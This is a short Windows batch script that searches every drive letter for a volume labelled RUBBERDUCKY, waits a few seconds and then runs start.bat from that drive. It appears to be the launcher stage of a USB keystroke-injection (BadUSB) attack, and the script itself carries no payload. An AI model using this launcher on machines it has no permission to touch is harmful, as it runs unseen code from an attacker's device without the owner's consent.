@echo off
goto start

:start
for %%a in (a b c d e f g h i j k l m n o p q r s t u v w x y z) do vol %%a: 2>nul | find "RUBBERDUCKY" >nul && set myDrive=%%a:
if "%myDrive%"=="" (goto start
) else (
ping 127.0.0.1 -n 6 > nul
cd /D %myDrive%
%myDrive%\start.bat
)